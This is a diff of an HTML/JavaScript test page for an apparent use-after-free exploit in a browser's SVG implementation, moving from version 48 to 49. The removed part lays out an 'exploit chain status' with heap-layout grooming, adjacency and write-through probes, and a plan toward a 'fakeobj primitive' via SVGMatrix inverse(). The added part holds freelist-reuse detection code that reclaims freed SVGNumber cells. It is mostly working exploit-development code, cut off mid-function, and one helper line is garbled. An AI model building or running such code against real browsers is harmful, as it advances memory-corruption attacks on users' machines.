@@ -2,130 +2,29 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>SVG UAF v48</title>
+<title>SVG UAF v49 — Freelist + Storage + Refcount + SVGLength</title>
 <style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{background:#0d0d0d;color:#00ff41;font-family:'Courier New',monospace;padding:16px;min-height:100vh}
-h2{color:#ff4141;font-size:11px;letter-spacing:2px;text-transform:uppercase}
-.sub{color:#444;font-size:10px;margin-bottom:8px;line-height:1.8}
-#controls{display:flex;gap:5px;flex-wrap:wrap;margin-bottom:8px}
-button{background:#111;border:1px solid #333;color:#00ff41;padding:5px 12px;cursor:pointer;font-family:monospace;font-size:10px}
-button:hover:not(:disabled){border-color:#00ff41}
-button:disabled{opacity:.3}
-#log{font-size:10px;line-height:1.7;white-space:pre-wrap;word-break:break-all;margin-top:6px}
-.ok{color:#00ff41}.bad{color:#ff4141}.inf{color:#ffcc00}.dim{color:#444}.sep{color:#1a1a1a}
-.win{color:#ff00ff}.crit{color:#ff6600}.mega{color:#ffffff;font-weight:bold}
-#sp{margin-top:24px;border:1px solid #333;border-radius:4px;overflow:hidden;display:none}
-#sp.on{display:block}
-.sh{background:#111;padding:8px 12px;font-size:11px;letter-spacing:2px;color:#ff4141;text-transform:uppercase;border-bottom:1px solid #333}
-.sb{padding:12px}
-.sr{display:flex;align-items:flex-start;gap:10px;padding:6px 0;border-bottom:1px solid #1a1a1a}
-.sr:last-child{border-bottom:none}
-.sd{width:10px;height:10px;border-radius:50%;flex-shrink:0;margin-top:3px}
-.dg{background:#00ff41;box-shadow:0 0 6px #00ff41}.dy{background:#ffcc00;box-shadow:0 0 6px #ffcc00}
-.dr{background:#ff4141;box-shadow:0 0 6px #ff4141}.dgr{background:#444}
-.sn{font-size:10px;color:#888;width:200px;flex-shrink:0}
-.sv{font-size:10px;flex:1}.vg{color:#00ff41}.vy{color:#ffcc00}.vr{color:#ff4141}.vgr{color:#444}
-.sf{font-size:10px;color:#555;padding-top:4px;line-height:1.8}
-.hl{color:#ffcc00}
-.sdiv{margin:10px 0;border-top:1px dashed #222}
+body{background:#0a0a0a;color:#e0e0e0;font-family:monospace;font-size:13px;padding:16px;margin:0}
+h2{color:#00ff88;margin:8px 0}
+.suite{border:1px solid #333;margin:8px 0;padding:8px}
+.hit{color:#00ff88}
+.miss{color:#ff4444}
+.info{color:#aaaaaa}
+.warn{color:#ffaa00}
+pre{white-space:pre-wrap;word-break:break-all;margin:2px 0}
 </style>
 </head>
 <body>
-<h2>SVG UAF v48 — Controlled Layout Oracle + Cross-Type Adjacency</h2>
-<div class="sub">
-v47 KEY WINS:
-- ORP1: ★★★ FULL orphaned list control — append/replace/insert/clear/initialize ALL work
-- ORP1: ★ cross-list insert — same SVGNumber in TWO orphaned lists simultaneously
-- LCK1: ★ initialize() — rebuilds orphaned list from scratch with any items
-- SZP1: ★★★ INTERLEAVED ALLOCATION — FCM1+FCM2 SVGNumbers interleave in IsoHeap
-  → allocation ORDER = memory LAYOUT. We CHOOSE the layout.
-- MTX1: matrix methods (translate/scale/rotate/multiply/inverse) work on orphaned SVGMatrix
-
-NEW v48 GOAL: CONTROLLED ADJACENCY → CROSS-TYPE WRITE
-
-v47 SZP1 proved: if we alternate appendItem() between two lists,
-IsoHeap allocates their SVGNumbers INTERLEAVED: A[0],B[0],A[1],B[1],...
-This means A[k] and B[k] are ADJACENT in memory (sizeof(SVGNumber) apart).
-
-SUITES:
-
-LAY1: Controlled interleave — prove A[k] and B[k] are adjacent
-  Create ListA and ListB by ALTERNATING one appendItem per list
-  Orphan ListA. Write to A[k].value. Check B[k] for contamination.
-  If B[k] shows A[k]'s write value → ADJACENT WRITE CONFIRMED
-  This directly gives us sizeof(SVGNumber) from the bleed pattern.
-
-LAY2: sizeof(SVGNumber) exact measurement
-  Once adjacency confirmed, binary-search for sizeof by writing specific
-  bit patterns and checking which field of B[k] gets contaminated.
-  SVGNumber memory layout guess: [vtable:8][refcount:4][pad?:4][m_value:4]
-  If bleed appears at B[k].m_value → sizeof = 16 or 20 or 24 or 32?
-  Method: write UNIQUE bit pattern, look for exact match in B[k].value
-  Also try: subnormal (0x00000001) and -0 (0x80000000) as bit markers
-
-XCT1: Cross-type adjacency write
-  Interleave SVGNumber allocs with SVGPoint allocs
-  (SVGPoint from SVGPolylineElement.points — different C++ type, different IsoHeap)
-  Wait — different IsoHeap. SVGPoint and SVGNumber are separate types.
-  REVISED: interleave SVGNumber from two DIFFERENT FCMs in one alternating loop
-  Write via FCM_A[k].value, check if FCM_B[k].value changes (k+1 or k-1 offset)
-  This is the DIRECT sizeof test.
-
-ADJ1: Adjacency via direct sequential write collision
-  Create ONE long list (200 items). All sequential. Orphan.
-  Write TAG_A to items 0..99. Write TAG_B to items 100..199.
-  Now read items 99 and 100: do their reads cross-contaminate?
-  No — they're in same list, same IsoHeap type.
-  THEN: create two lists, A=100 items sequential, B=100 items sequential.
-  A items are at lower addresses (allocated first), B items just above.
-  Orphan A. Write A[99].value = BIG_MARKER (something visually distinct as float32).
-  Read B[0].value — if it changed, sizeof(SVGNumber) = known from the gap.
-
-INV1: inverse() oracle — use matrix inverse as computation primitive
-  We can write 6 floats to an orphaned SVGMatrix, call inverse(), get 6 new floats back.
-  This is a CONTROLLED COMPUTATION through a UAF object.
-  Test: encode data in (a,b,c,d,e,f), call inverse(), what comes out?
-  Key insight: if we can make inverse() produce a value that looks like a valid JSC pointer
-  format (NaN-boxed), that's a step toward fakeobj primitive.
-  For now: map out the input→output relationship exhaustively.
-  Specifically: what input matrix produces inverse().a = 1.0 exactly?
-  Answer: identity matrix. But can we find inputs that produce SPECIFIC bit patterns?
-</div>
-<div id="controls">
-  <button onclick="runLAY1()">LAY1</button>
-  <button onclick="runLAY2()">LAY2</button>
-  <button onclick="runXCT1()">XCT1</button>
-  <button onclick="runADJ1()">ADJ1</button>
-  <button onclick="runINV1()">INV1</button>
-  <button onclick="runAll()">RUN ALL</button>
-  <button onclick="copyLog()">COPY</button>
-  <button onclick="clearAll()">CLR</button>
-</div>
-<div id="log"></div>
-<div id="sp"><div class="sh">⚡ v48 — EXPLOIT CHAIN STATUS</div><div class="sb" id="sb"></div></div>
+<h2>SVG UAF v49 — Freelist + Storage + Refcount + SVGLength</h2>
+<div id="out"></div>
 <script>
 var SVG_NS='http://www.w3.org/2000/svg';
-var EL=document.getElementById('log');
-var SP=document.getElementById('sp');
-var SB=document.getElementById('sb');
+var log_lines=[];
+function L(s){log_lines.push(s);var d=document.getElementById('out');var p=document.createElement('pre');p.textContent=s;d.appendChild(p);}
 
-var R={
-  lay1:{hit:false,adjacent:false,bleedOffset:0,detail:''},
-  lay2:{hit:false,sizeof:0,detail:''},
-  xct1:{hit:false,crossType:false,detail:''},
-  adj1:{hit:false,sizeof:0,detail:''},
-  inv1:{hit:false,detail:''},
-};
-
-function log(m,c){var s=document.createElement('span');if(c)s.className=c;s.textContent=m+'\n';EL.appendChild(s);EL.scrollTop=EL.scrollHeight;}
-function sep(){log('----------------------------------------------------','sep');}
-function raf(){return new Promise(function(r){requestAnimationFrame(r);});}
-function copyLog(){var t=EL.innerText+'\n'+(SB.innerText||'');try{navigator.clipboard.writeText(t);}catch(e){var a=document.createElement('textarea');a.value=t;document.body.appendChild(a);a.select();document.execCommand('copy');a.remove();}}
-function clearAll(){EL.innerHTML='';SP.classList.remove('on');SB.innerHTML='';}
-function dis(d){var b=document.querySelectorAll('button');for(var i=0;i<b.length;i++){var f=b[i].getAttribute('onclick')||'';if(f.indexOf('copy')===-1&&f.indexOf('clear')===-1)b[i].disabled=d;}}
-window.onerror=function(m,u,l){log('[CRASH] '+m+' L'+l,'bad');return false;};
-
+// ─────────────────────────────────────────────────────────────────
+// HELPERS
+// ─────────────────────────────────────────────────────────────────
 function makeSVG(){
   var svg=document.createElementNS(SVG_NS,'svg');
   svg.setAttribute('width','1');svg.setAttribute('height','1');
@@ -135,922 +34,504 @@ function makeSVG(){
 }
 function removeSVG(svg){if(svg&&svg.parentNode)svg.parentNode.removeChild(svg);}
 
-// Make an SVGNumber via createSVGNumber() on a live SVGSVGElement
-var _tmpSVG=null;
-function getTmpSVG(){
-  if(!_tmpSVG||!_tmpSVG.parentNode){
-    _tmpSVG=makeSVG();
-  }
-  return _tmpSVG;
-}
-function makeNum(val){
-  var n=getTmpSVG().createSVGNumber();
-  n.value=val;
-  return n;
-}
-
-// Make an FCM with an empty list (length 0), ready to receive items one by one
-function makeEmptyFCM(){
-  var svg=makeSVG();
-  var defs=document.createElementNS(SVG_NS,'defs');
+function makeFCM(svg,vals){
+  var f=document.createElementNS(SVG_NS,'feColorMatrix');
+  f.setAttribute('type','matrix');
+  f.setAttribute('values','1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0');
   var filt=document.createElementNS(SVG_NS,'filter');
-  filt.setAttribute('id','f'+Math.random().toString(36).slice(2,8));
-  var fcm=document.createElementNS(SVG_NS,'feColorMatrix');
-  fcm.setAttribute('type','matrix');
-  // Start with empty values — we'll appendItem manually
-  // Actually feColorMatrix always inits with 20 values. Use clearList first.
-  fcm.setAttribute('values','0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0');
-  filt.appendChild(fcm);defs.appendChild(filt);svg.appendChild(defs);
-  var bl=fcm.values.baseVal;
-  // Clear all 20 items so we start empty
-  try{bl.clear();}catch(e){
-    // clear() may not exist, do removeItem loop
-    for(var i=bl.length-1;i>=0;i--){try{bl.removeItem(i);}catch(ex){}}
-  }
-  return{svg:svg,filt:filt,fcm:fcm,bl:bl};
+  filt.setAttribute('id','f'+Math.random().toString(36).slice(2));
+  filt.appendChild(f);
+  svg.appendChild(filt);
+  var bl=f.values.baseVal;
+  bl.clear();
+  if(vals){for(var i=0;i<vals.length;i++){var n=svg.ownerDocument.createElementNS? svg.createElementNS? svg.createElementNS(SVG_NS,'svg'):null:null; var num=makeSVGNum(vals[i]);bl.appendItem(num);}}
+  return {f:f,filt:filt,bl:bl};
 }
 
-/*
- * LAY1: Controlled Interleave Adjacency Test
- *
- * KEY INSIGHT from v47 SZP1: when two FCMs are created simultaneously (alternating appends),
- * their SVGNumbers are INTERLEAVED in IsoHeap:
- *   mem: [A0][B0][A1][B1][A2][B2]...
- * This means A[k] and B[k] are ADJACENT (sizeof(SVGNumber) apart).
- *
- * METHOD:
- * 1. Create two empty FCMs (fcmA, fcmB), both in DOM
- * 2. Alternate: fcmA.appendItem(numA_k), fcmB.appendItem(numB_k) for k=0..N-1
- * 3. This allocates: numA_0, numB_0, numA_1, numB_1, ...
- * 4. Tag each: A[k]=TAG_A+k, B[k]=TAG_B+k
- * 5. Orphan fcmA (remove all items + DOM removal)
- * 6. Write MARKER to A[k].value (all k)
- * 7. Read B[k].value for contamination
- *
- * Expected: no contamination (A[k] and B[k] are adjacent, sizeof apart)
- *   UNLESS sizeof(SVGNumber) is small enough that A[k].m_value write bleeds into B[k]
- *
- * Actually: the float WRITE to A[k].m_value is exactly 4 bytes at offset [sizeof-4] from A[k].
- * It can only bleed into B[k] if sizeof(SVGNumber) == 4 (impossible) or if there's no padding.
- * More realistically: A[k].m_value write WON'T bleed into B[k].m_value (different offset).
- * BUT: if sizeof(SVGNumber) == 16, then:
- *   A[k] at addr X, A[k].m_value at X+12 (after vtable+refcount)
- *   B[k] at addr X+16, B[k].vtable at X+16
- *   Writing 4 bytes at X+12 → bytes X+12,X+13,X+14,X+15
- *   B[k] starts at X+16 → no overlap
- * BUT: if sizeof == 12:
- *   A[k] at X, A[k].m_value at X+8
- *   B[k] at X+12, B[k].vtable at X+12
- *   Writing at X+8 (4 bytes) → X+8,X+9,X+10,X+11
- *   B[k] vtable starts at X+12 → still no overlap
- * WAIT: if sizeof == 8:
- *   A[k].m_value at X+4 (after 4-byte refcount, no vtable?)
- *   Writing at X+4 → X+4..X+7
- *   B[k] at X+8 → no overlap
- *
- * Hmm. m_value write (4 bytes) will ONLY reach B[k] if it overflows PAST A[k].
- * That only happens if we can write BEYOND the float field, which our current API caps at FLT_MAX.
- * BUT: what about the LIST STRUCTURE ITSELF? The SVGNumberList holds an internal WTF::Vector
- * of Ref<SVGNumber>. Each Ref<> is a pointer (8 bytes on 64-bit).
- * That vector's backing store IS a fastMalloc allocation → zeroed.
- * The SVGNumbers themselves are in IsoHeap → NOT zeroed.
- *
- * NEW APPROACH FOR LAY1:
- * Since we have FULL ORPHANED LIST CONTROL (v47 ORP1/LCK1):
- * Use initialize() + appendItem() to PUT A[k] and B[k] INTO THE SAME ORPHANED LIST.
- * Then they're adjacent in the LIST VECTOR (consecutive Ref<> pointers).
- * Still doesn't give us cross-write, but it CONFIRMS ORDER.
- *
- * BEST LAY1 APPROACH: measure via value precision at boundary
- * The SZP1 contamination pattern showed odd FCM2 items reading ±1 from expected.
- * This wasn't physical bleed — it was float32 precision collision at 10M magnitude.
- * So: use SMALL values (< 100) where float32 is EXACT and has no rounding.
- * Re-run SZP1 with TAG = 1..40 (not 10M). Then contamination pattern will be exact.
- * If B[1] reads A[0]'s value, they're physically interleaved and A[0]'s float
- * is at the same address as B[1]'s float (sizeof apart).
- */
-async function runLAY1(q){
-  if(!q){dis(true);sep();log('LAY1: Controlled interleave adjacency test','inf');sep();}
+// Use a tmp SVG for createSVGNumber
+var _tmpSVG=null;
+function getTmpSVG(){if(!_tmpSVG){_tmpSVG=document.createElementNS(SVG_NS,'svg');document.body.appendChild(_tmpSVG);}return _tmpSVG;}
+function makeSVGNum(val){var n=getTmpSVG().createSVGNumber();n.value=val;return n;}
 
-  // Create two FCMs, alternate appendItem between them
-  // Use SMALL integer tags (1..40) where float32 is bit-exact
-  var fcmA=makeEmptyFCM();
-  var fcmB=makeEmptyFCM();
-  await raf();
-
-  var refsA=[],refsB=[];
-  var N=20;
-
-  log('  LAY1: alternating appendItem between fcmA and fcmB...','dim');
-  for(var k=0;k<N;k++){
-    var nA=makeNum(100+k);   // A[k] = 100,101,...,119
-    var nB=makeNum(200+k);   // B[k] = 200,201,...,219
-    try{fcmA.bl.appendItem(nA);refsA.push(nA);}catch(e){log('  LAY1: appendA['+k+'] fail: '+e,'bad');}
-    try{fcmB.bl.appendItem(nB);refsB.push(nB);}catch(e){log('  LAY1: appendB['+k+'] fail: '+e,'bad');}
+// Build a FCM with N items, values from valFn(i)
+function buildFCM(svg, N, valFn){
+  var f=document.createElementNS(SVG_NS,'feColorMatrix');
+  f.setAttribute('type','matrix');
+  f.setAttribute('values','1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0');
+  var filt=document.createElementNS(SVG_NS,'filter');
+  filt.setAttribute('id','fid'+Math.random().toString(36).slice(2));
+  filt.appendChild(f);
+  svg.appendChild(filt);
+  var bl=f.values.baseVal;
+  bl.clear();
+  var refs=[];
+  for(var i=0;i<N;i++){
+    var num=makeSVGNum(valFn(i));
+    bl.appendItem(num);
+    refs.push(bl.getItem(bl.length-1));
   }
-
-  log('  LAY1: A.length='+fcmA.bl.length+' B.length='+fcmB.bl.length,'dim');
-  await raf();
-
-  // Verify tags
-  var okA=0,okB=0;
-  for(var k=0;k<refsA.length;k++){try{if(refsA[k].value===100+k)okA++;}catch(e){}}
-  for(var k=0;k<refsB.length;k++){try{if(refsB[k].value===200+k)okB++;}catch(e){}}
-  log('  LAY1: tags verified: A='+okA+'/'+refsA.length+' B='+okB+'/'+refsB.length,'dim');
-
-  // Orphan fcmA (remove items + DOM removal)
-  for(var i=fcmA.bl.length-1;i>=0;i--){try{fcmA.bl.removeItem(i);}catch(e){}}
-  removeSVG(fcmA.svg);
-  await raf();
-
-  // Verify A still alive
-  var aliveA=0;
-  for(var k=0;k<refsA.length;k++){try{if(!isNaN(refsA[k].value))aliveA++;}catch(e){}}
-  log('  LAY1: after orphan fcmA: alive='+aliveA+'/'+refsA.length,'dim');
-
-  // WRITE phase: write DISTINCT pattern to ALL A[k]
-  // Use values that are EXACT float32 AND far from B's tag range
-  var WRITE_A=500; // far from 100-119 and 200-219
-  for(var k=0;k<refsA.length;k++){
-    try{refsA[k].value=WRITE_A+k;}catch(e){log('  LAY1: write A['+k+'] fail: '+e,'bad');}
-  }
-  log('  LAY1: wrote WRITE_A='+WRITE_A+'..'+( WRITE_A+refsA.length-1)+' to all A refs','dim');
-
-  // READ phase: check all B refs for contamination
-  log('  LAY1: checking B refs for contamination...','dim');
-  var contam=[];
-  for(var k=0;k<refsB.length;k++){
-    try{
-      var bv=refsB[k].value;
-      var expected=200+k;
-      if(bv!==expected){
-        contam.push({k:k,expected:expected,got:bv});
-        log('  LAY1: ★ B['+k+'] CONTAMINATED: expected='+expected+' got='+bv,'win');
-      } else {
-        log('  LAY1: B['+k+']='+bv+' (clean)','dim');
-      }
-    }catch(e){log('  LAY1: B['+k+'] threw: '+e,'bad');}
-  }
-
-  if(contam.length>0){
-    log('  LAY1: ★★ ADJACENCY CONFIRMED! '+contam.length+' B items contaminated by A writes!','mega');
-    // Determine bleed offset: if B[k] got A[k]'s write, the two are adjacent
-    // If B[k] got A[k-1]'s write, there's a 1-offset interleaving
-    for(var i=0;i<Math.min(contam.length,5);i++){
-      var c=contam[i];
-      log('    B['+c.k+']='+c.got+' expected='+c.expected+
-        ' — matches A['+(c.got-WRITE_A)+'] (offset='+(c.k-(c.got-WRITE_A))+')','crit');
-    }
-    R.lay1.adjacent=true;
-    R.lay1.bleedOffset=contam[0].k-(contam[0].got-WRITE_A);
-  } else {
-    log('  LAY1: no contamination — A and B floats not at same addresses','dim');
-    log('  LAY1: (expected — A[k].m_value write does not overflow into B[k])','dim');
-    log('  LAY1: BUT: proving interleave via ORDER ORACLE instead...','inf');
-
-    // ORDER ORACLE: can we detect interleaving by checking if B[k] REFS are
-    // the same object as we allocated, in the correct order?
-    // Since B is still in DOM (not orphaned), fcmB.bl should still be live
-    log('  LAY1: fcmB still in DOM. fcmB.bl.length='+fcmB.bl.length,'dim');
-    // Check if fcmB.bl[k] === refsB[k] (same JS wrapper? same underlying SVGNumber?)
-    var sameCount=0;
-    for(var k=0;k<Math.min(5,refsB.length);k++){
-      var listItem=null;
-      try{listItem=fcmB.bl[k];}catch(e){}
-      if(listItem){
-        var sameVal=listItem.value===refsB[k].value;
-        log('    fcmB.bl['+k+'].value='+listItem.value+' refsB['+k+'].value='+refsB[k].value+
-          ' same='+(listItem===refsB[k]),'dim');
-        if(sameVal)sameCount++;
-      }
-    }
-    log('  LAY1: values match: '+sameCount+'/5 (confirms our refs track the list)','dim');
-  }
-
-  // CLEAN UP fcmB
-  removeSVG(fcmB.svg);
-
-  R.lay1.hit=R.lay1.adjacent;
-  R.lay1.detail='contam='+contam.length+' adjacent='+R.lay1.adjacent;
-  log('  LAY1: '+R.lay1.detail,R.lay1.hit?'win':'dim');
-
-  if(!q)dis(false);
+  return {f:f,filt:filt,bl:bl,refs:refs,svg:svg};
 }
 
-/*
- * LAY2: sizeof(SVGNumber) via BIT MARKER method
- *
- * SZP1 v47 showed contamination but at high magnitude (10M+) where float32 precision
- * blurs the distinction. We need to redo with SMALL integer values.
- *
- * CRITICAL SETUP: create N SVGNumbers SEQUENTIALLY in ONE list (not interleaved).
- * All N are contiguous in IsoHeap<SVGNumber>.
- * Then create N MORE in a second list — also contiguous, right after the first batch.
- * So memory: [A0,A1,...,A(N-1), B0,B1,...,B(N-1)]
- *
- * Now: orphan ALL A items. Write to A[N-1] (the LAST A item, closest to B[0]).
- * Write BIT MARKERS: -0 (0x80000000), subnormal 2^-149 (0x00000001), 1.0, -1.0, etc.
- * Check B[0] for contamination.
- *
- * If sizeof(SVGNumber) == S, then:
- *   A[N-1] starts at base + (N-1)*S
- *   A[N-1].m_value is at base + (N-1)*S + offset_of_m_value
- *   B[0] starts at base + N*S
- *   A[N-1].m_value + 4 == B[0] start IF S == offset_of_m_value + 4
- *   i.e., if m_value is the LAST field in SVGNumber
- *
- * Common SVGNumber layout guesses:
- *   WebKit SVGNumber : public SVGPropertyBase<SVGNumber> : public RefCounted<>
- *   RefCounted: [m_refCount: int (4)]
- *   SVGPropertyBase: maybe [m_contextElement: WeakPtr (8+8?)]
- *   SVGNumber: [m_value: float (4)]
- *   Total: 4 + 16 + 4 = 24? Or 8 (vtable) + 4 (refcount) + 4 (pad) + 8 (weakptr) + 4 (m_value) = 28?
- *   IsoHeap cell sizes: 8,16,24,32,40,48,64... (powers of 8)
- *   Most likely: 24 or 32 bytes
- *
- * METHOD: try many write values on A[N-1] and look for ANY change in B[0]
- * Since IsoHeap cells are sized at 8-byte multiples, A[N-1] is S bytes before B[0].
- * m_value is at some offset inside A[N-1]. The LAST 4 bytes of A[N-1] are at A[N-1]+S-4.
- * If m_value == S-4 → writing m_value writes to bytes [S-4..S-1] of A[N-1] → right before B[0].
- * Then B[0]'s vtable (first 8 bytes) is NOT affected.
- * BUT: what if sizeof(SVGNumber) < offset_of_m_value + 8?
- * Then m_value might OVERLAP with B[0]'s first 4 bytes.
- *
- * JUST PROBE: write to A[N-1] with many values, read B[0] after each.
- * If B[0].value ever changes → we got a write-through.
- */
-async function runLAY2(q){
-  if(!q){dis(true);sep();log('LAY2: sizeof(SVGNumber) via bit marker write-through','inf');sep();}
+function orphanFCM(fcm){
+  // Remove filter from svg (orphans all SVGNumbers in the list)
+  if(fcm.filt&&fcm.filt.parentNode) fcm.filt.parentNode.removeChild(fcm.filt);
+}
+
+// ─────────────────────────────────────────────────────────────────
+// FRL1 — FREELIST REUSE DETECTION
+// Are C++ SVGNumbers truly freed (UAF) or kept alive by JS Ref<>?
+// ─────────────────────────────────────────────────────────────────
+function runFRL1(){
+  L('');L('FRL1: Freelist Reuse Detection');L('  Goal: orphan 100 tagged SVGNumbers → alloc 100 fresh → check if orphaned refs show new values');
 
   var svg1=makeSVG();
-  var defs1=document.createElementNS(SVG_NS,'defs');
-  var filt1=document.createElementNS(SVG_NS,'filter');
-  filt1.setAttribute('id','flay2a'+Math.random().toString(36).slice(2,6));
-  var fcm1=document.createElementNS(SVG_NS,'feColorMatrix');
-  fcm1.setAttribute('type','matrix');
-  fcm1.setAttribute('values','1 0 0 0 0 0 1 0 0 0 0 0 1 0 0 0 0 0 1 0');
-  filt1.appendChild(fcm1);defs1.appendChild(filt1);svg1.appendChild(defs1);
-
   var svg2=makeSVG();
-  var defs2=document.createElementNS(SVG_NS,'defs');
-  var filt2=document.createElementNS(SVG_NS,'filter');
-  filt2.setAttribute('id','flay2b'+Math.random().toString(36).slice(2,6));
-  var fcm2=document.createElementNS(SVG_NS,'feColorMatrix');
-  fcm2.setAttribute('type','matrix');
-  fcm2.setAttribute('values','1 0 0 0 0 0 1 0 0 0 0 0 1 0 0 0 0 0 1 0');
-  filt2.appendChild(fcm2);defs2.appendChild(filt2);svg2.appendChild(defs2);
-  await raf();
 
-  var bl1=fcm1.values.baseVal;
-  var bl2=fcm2.values.baseVal;
+  var N=100;
+  var TAG_BASE=1001;  // orphaned tags: 1001..1100
+  var NEW_BASE=2001;  // new alloc tags: 2001..2100
 
-  // Tag: A[k]=1000+k (small, exact f32), B[k]=2000+k
-  var refsA=[];
-  for(var i=0;i<20;i++){try{var r=bl1[i];r.value=1000+i;refsA.push(r);}catch(e){refsA.push(null);}}
-  var refsB=[];
-  for(var i=0;i<20;i++){try{var r=bl2[i];r.value=2000+i;refsB.push(r);}catch(e){refsB.push(null);}}
+  // Step 1: Alloc 100 SVGNumbers with tags TAG_BASE..TAG_BASE+N-1
+  var fcmOld=buildFCM(svg1, N, function(i){return TAG_BASE+i;});
+  L('  FRL1: allocated '+N+' tagged SVGNumbers ('+TAG_BASE+' .. '+(TAG_BASE+N-1)+')');
 
-  log('  LAY2: tagged A[0..19]=1000..1019, B[0..19]=2000..2019','dim');
+  // Verify tags before orphan
+  var allGood=true;
+  for(var i=0;i<N;i++){
+    if(fcmOld.refs[i].value !== TAG_BASE+i){allGood=false;break;}
+  }
+  L('  FRL1: pre-orphan tags verified: '+(allGood?'OK':'FAIL'));
 
-  // Orphan A (but keep B live)
-  for(var i=bl1.length-1;i>=0;i--){try{bl1.removeItem(i);}catch(e){}}
+  // Step 2: Orphan all 100 (remove filter from DOM, keep JS refs alive)
+  orphanFCM(fcmOld);
+  // Also remove the SVG itself
   removeSVG(svg1);
-  await raf();
+  // Keep refs alive: fcmOld.refs[] still holds JS objects
 
-  var aliveA=0;
-  for(var i=0;i<refsA.length;i++){try{if(!isNaN(refsA[i].value))aliveA++;}catch(e){}}
-  log('  LAY2: A orphaned, alive='+aliveA+'/20. B still in DOM.','dim');
-
-  // Record B[0] initial value
-  var b0_init=null;
-  try{b0_init=refsB[0].value;}catch(e){}
-  log('  LAY2: B[0] initial='+b0_init,'dim');
-
-  // PROBE: write various bit patterns to A[19] (last A item, closest to B[0])
-  var probeValues=[
-    0, 1, -1, 0.5, 1.0, 2.0, 127.0, 256.0, 65535.0, 1048576.0,
-    1.401298464324817e-45,  // 0x00000001 subnormal
-    2.802596928649634e-45,  // 0x00000002
-    -0,                      // 0x80000000
-    1.1754943508222875e-38, // 0x00800000 min normal
-    3.4028234663852886e+38, // 0x7F7FFFFF FLT_MAX
-    -3.4028234663852886e+38,// 0xFF7FFFFF -FLT_MAX
-    1.5,1.25,1.125,1.0625   // Various exact f32
-  ];
-
-  var writeThrough=[];
-  log('  LAY2: probing A[19] writes, checking B[0] for change...','dim');
-  for(var pi=0;pi<probeValues.length;pi++){
-    var pv=probeValues[pi];
-    try{refsA[19].value=pv;}catch(e){log('  LAY2: write A[19]='+pv+' threw: '+e,'dim');continue;}
-    var b0_after=null;
-    try{b0_after=refsB[0].value;}catch(e){}
-    if(b0_after!==b0_init){
-      writeThrough.push({wrote:pv,b0was:b0_init,b0now:b0_after});
-      log('  LAY2: ★ WRITE-THROUGH! wrote A[19]='+pv+' → B[0] changed from '+b0_init+' to '+b0_after,'mega');
-    }
+  // Verify refs still readable after orphan
+  var aliveCount=0;
+  for(var i=0;i<N;i++){
+    try{var v=fcmOld.refs[i].value;if(v===TAG_BASE+i)aliveCount++;}catch(e){}
   }
+  L('  FRL1: after orphan, refs still readable: '+aliveCount+'/'+N);
 
-  if(writeThrough.length===0){
-    log('  LAY2: no write-through on A[19]→B[0] — trying A[19]→B[-1..+2]...','dim');
-    // Also try nearby B items
-    for(var bi=-1;bi<=3;bi++){
-      if(bi<0||bi>=refsB.length)continue;
-      var bv_init=null;
-      try{bv_init=refsB[bi].value;}catch(e){continue;}
-      try{refsA[19].value=9999;}catch(e){}
-      var bv_after=null;
-      try{bv_after=refsB[bi].value;}catch(e){}
-      if(bv_after!==bv_init){
-        log('  LAY2: ★ write A[19]→B['+bi+'] CHANGED: was='+bv_init+' now='+bv_after,'win');
-        writeThrough.push({idx:bi,wrote:9999,before:bv_init,after:bv_after});
+  // Step 3: Immediately allocate 100 NEW SVGNumbers (in fresh SVG)
+  // This is the critical groom — if freelist reuse happens, new allocs land in same cells
+  var fcmNew=buildFCM(svg2, N, function(i){return NEW_BASE+i;});
+  L('  FRL1: allocated '+N+' NEW SVGNumbers ('+NEW_BASE+' .. '+(NEW_BASE+N-1)+')');
+
+  // Step 4: Check orphaned refs for value changes
+  var reused=0;
+  var unchanged=0;
+  var changed_details=[];
+  for(var i=0;i<N;i++){
+    try{
+      var v=fcmOld.refs[i].value;
+      if(v===TAG_BASE+i){
+        unchanged++;
       } else {
-        log('  LAY2: A[19]→B['+bi+']: no change (B['+bi+']='+bv_after+')','dim');
+        reused++;
+        if(changed_details.length<5) changed_details.push({idx:i,old:TAG_BASE+i,got:v});
       }
+    }catch(e){
+      // threw = possibly freed
+      reused++;
+      if(changed_details.length<5) changed_details.push({idx:i,threw:true});
+    }
+  }
+  L('  FRL1: unchanged (bump-only / alive): '+unchanged+'/'+N);
+  L('  FRL1: changed/threw (freelist reuse!): '+reused+'/'+N);
+  if(changed_details.length>0){
+    for(var j=0;j<changed_details.length;j++){
+      var d=changed_details[j];
+      if(d.threw) L('  FRL1: ref['+d.idx+'] THREW (cell freed+reused?)');
+      else L('  FRL1: ref['+d.idx+'] was='+(d.old)+' got='+d.got+' (NEW_BASE+'+(d.got-NEW_BASE)+'?)');
     }
   }
 
-  // ALSO: probe B[0]→B[1] distance via A writes
-  // If we can change B[0] indirectly via A[19], the same pattern
-  // should let us change B[k] via A[k+delta]
-  log('  LAY2: also checking B item-to-item isolation (B[0] write → check B[1])...','dim');
-  var b1_init=null;
-  try{b1_init=refsB[1].value;}catch(e){}
-  // Write extreme to B[0] (still in DOM, live write)
-  try{
-    var bl2live=fcm2.values.baseVal;
-    if(bl2live&&bl2live[0])bl2live[0].value=99999;
-    var b1_after=null;
-    try{b1_after=refsB[1].value;}catch(e){}
-    log('  LAY2: wrote B[0]=99999. B[1] changed? was='+b1_init+' now='+b1_after,'dim');
-    if(b1_after!==b1_init)log('  LAY2: ★ B[0] write contaminated B[1]! sizeof ≤ 8?','mega');
-  }catch(e){log('  LAY2: B[0] live write test threw: '+e,'dim');}
+  // Additional: try a second wave alloc to stress more
+  L('  FRL1: stress wave 2 — 200 more allocs...');
+  var svg3=makeSVG();
+  // alloc 200 in 10 FCMs of 20
+  var wave2_fcms=[];
+  for(var k=0;k<10;k++){
+    var base=3001+k*20;
+    var fcmW=buildFCM(svg3, 20, function(base){return function(i){return base+i;};}(base));
+    wave2_fcms.push(fcmW);
+  }
+  // Check orphaned refs again
+  var reused2=0,unchanged2=0;
+  for(var i=0;i<N;i++){
+    try{
+      var v=fcmOld.refs[i].value;
+      if(v===TAG_BASE+i) unchanged2++;
+      else reused2++;
+    }catch(e){reused2++;}
+  }
+  L('  FRL1: after wave2: unchanged='+unchanged2+' changed/threw='+reused2);
 
-  removeSVG(svg2);
